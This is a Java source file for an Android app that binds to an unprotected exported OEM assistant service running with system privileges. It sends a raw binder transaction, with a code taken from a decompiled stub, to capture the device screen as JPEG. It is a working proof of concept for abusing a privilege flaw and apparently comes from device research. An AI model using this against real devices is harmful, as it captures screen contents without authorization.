package pl.mateusz.clockadbprobe;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.IBinder;
import android.os.Parcel;
import android.os.SharedMemory;

import java.nio.ByteBuffer;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

/**
 * Raw binder client for the unprotected exported OEM service in com.google.oem
 * (system uid). We speak the interface descriptor directly instead of shipping
 * matching AIDL — transaction codes come from the decompiled stub
 * (IAssistantOemService.TRANSACTION_takeScreenshot == 13).
 */
public final class OemClient {

    private static final String DESCRIPTOR = "com.google.assistant.IAssistantOemService";
    private static final ComponentName OEM_SERVICE = new ComponentName(
            "com.google.assistant.oemapp", "com.google.assistant.oemapp.ScoriaAssistantOemService");
    private static final int TRANSACTION_TAKE_SCREENSHOT = 13;

    private OemClient() {}

    /** @return JPEG bytes of the clock screen, captured by the system-uid OEM service. */
    public static byte[] screenshot(Context ctx) throws Exception {
        final CountDownLatch latch = new CountDownLatch(1);
        final AtomicReference<IBinder> binderRef = new AtomicReference<>();
        ServiceConnection conn = new ServiceConnection() {
            @Override public void onServiceConnected(ComponentName name, IBinder service) {
                binderRef.set(service);
                latch.countDown();
            }
            @Override public void onServiceDisconnected(ComponentName name) {}
        };
        Intent it = new Intent("com.google.assistant.START_OEM_SERVICE");
        it.setComponent(OEM_SERVICE);
        if (!ctx.bindService(it, conn, Context.BIND_AUTO_CREATE)) {
            throw new IllegalStateException("bindService refused (component gone or not exported?)");
        }
        try {
            if (!latch.await(6, TimeUnit.SECONDS)) {
                throw new IllegalStateException("service connect timeout");
            }
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                binderRef.get().transact(TRANSACTION_TAKE_SCREENSHOT, data, reply, 0);
                reply.readException();
                SharedMemory sm = reply.readTypedObject(SharedMemory.CREATOR);
                if (sm == null) return null;
                ByteBuffer bb = sm.mapReadOnly();
                byte[] out = new byte[sm.getSize()];
                bb.get(out);
                SharedMemory.unmap(bb);
                sm.close();
                return out;
            } finally {
                data.recycle();
                reply.recycle();
            }
        } finally {
            try { ctx.unbindService(conn); } catch (Throwable ignored) {}
        }
    }
}
